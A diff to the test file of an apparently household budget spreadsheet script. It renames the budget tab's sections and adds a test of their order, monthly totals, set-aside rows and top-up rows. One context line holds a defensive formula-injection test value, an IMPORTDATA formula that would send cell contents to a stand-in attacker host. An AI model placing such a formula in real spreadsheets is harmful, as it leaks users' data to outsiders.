@@ -70,7 +70,7 @@ c.CACHE_ = {};
 c.refreshBudgetTabs();
 ok("budget tabs written", env.sheets["Ethan budget"] && env.sheets["Sophie budget"] && env.sheets["Ethan budget"]._s.cells.length > 10);
 const eb = env.sheets["Ethan budget"]._s.cells.map(r => r[0]);
-ok("budget tab has sections", ["Money in", "Bills", "Spending", "Savings"].every(x => eb.includes(x)), eb);
+ok("budget tab has sections", ["Coming in", "Bills to pay", "What you can spend", "What's saved", "Left over"].every(x => eb.includes(x)), eb);
 // a bill named like a formula goes into the budget tab as plain text
 { const evil = '=IMPORTDATA("https://evil.example/?d="&A1)';
   const sb = c.readTable_("bills").rows.find(r => r.person === "sophie");
@@ -508,6 +508,35 @@ const phone = (F, k) => { const P = {T: {}, since: 0}; P.sync = (ops) => { const
   for (let i = 0; i < 3; i++) F.c.refreshBudgetTabs();
   const tab = F.env.sheets["Ethan budget"];
   ok("R11: one protection on the budget tab after three refreshes", tab && tab._s.protections.length === 1, tab && tab._s.protections.length);
+}
+
+// T1 (1.4.18): the budget tab reads like the Money tab: its sections, money set aside for a yearly bill under bills, a
+// top-up in what's saved and what's left over, for both of you and every month column
+{
+  const B = require("../engine.js");
+  const F = fresh(t => t.transactions.push({id: "t-over", date: "2026-11-10", person: "ethan", amount: 300, budget: "e-fun", account: "e-main"}));
+  const real = F.c.Utilities.formatDate; F.c.Utilities.formatDate = (d, tz, f) => f === "yyyy-MM-dd" ? "2026-12-05" : real(d, tz, f);
+  F.c.refreshBudgetTabs(); F.c.Utilities.formatDate = real;
+  const db = B.load(F.c.allTables_(), "2026-12-05");
+  ["ethan", "sophie"].forEach(p => {
+    const cells = F.env.sheets[db.byId[p].name + " budget"]._s.cells, col0 = cells.map(r => r[0]), at = x => col0.indexOf(x);
+    const per = [B.periodAt(db, p, "2026-12-05")]; for (let i = 0; i < 5; i++) per.push(B.nextPeriod(db, p, per[i]));
+    const kt = per.map(pk => B.kinds(B.planFor(db, p, pk).lines));
+    // (a kind with nothing in any of the six months, like Sophie's saving here, has no section)
+    const has = ["in", "bill", "spend", "save"].map(k => per.some(pk => B.planFor(db, p, pk).lines.some(l => B.kindOf(l) === k)));
+    const heads = ["Coming in", "Bills to pay", "What you can spend", "What's saved"].filter((x, i) => has[i]);
+    ok("T1 " + p + ": the Money tab's sections, in its order", heads.length >= 3 && heads.map(at).every((v, i, a) => v > 0 && (!i || v > a[i - 1])) && ["Coming in", "Bills to pay", "What you can spend", "What's saved"].filter((x, i) => !has[i]).every(x => at(x) < 0), col0);
+    ok("T1 " + p + ": no old sections or Top-ups", !["Money in", "Bills", "Spending", "Savings", "Top-ups"].some(x => col0.includes(x)) && !col0.some(x => /^Total /.test(x)), col0);
+    const row = x => cells[at(x)].slice(1);
+    ok("T1 " + p + ": each heading has its total for every month", ["in", "bill", "spend", "save"].every((k, i) => !has[i] || JSON.stringify(row(["Coming in", "Bills to pay", "What you can spend", "What's saved"][i])) === JSON.stringify(kt.map(t => t[k]))), kt);
+    ok("T1 " + p + ": left over for every month, and it adds up", JSON.stringify(row("Left over")) === JSON.stringify(kt.map(t => Math.max(0, t.left))) && row("Left over").length === 6, row("Left over"));
+    const setAside = col0.filter(x => /^Set aside for /.test(x));
+    ok("T1 " + p + ": set aside for a yearly bill is under bills", setAside.every(x => at(x) > at("Bills to pay") && at(x) < at("What you can spend")), {setAside, col0});
+    if (p === "sophie") ok("T1 sophie: her membership is set aside for", setAside.includes("Set aside for Membership"), col0);
+    const top = col0.filter(x => /^Top up /.test(x));
+    ok("T1 " + p + ": a top-up is in what's saved", top.every(x => at("What's saved") > 0 && at(x) > at("What's saved") && at(x) < at("Left over")), {top, col0});
+    if (p === "ethan") ok("T1 ethan: the Emergency pot's top-up (he went over Fun in November) is saved", top.includes("Top up Emergency pot"), col0);
+  });
 }
 
 // R12: text the sheet would turn into a date, time or number is kept as typed; a list is written as text
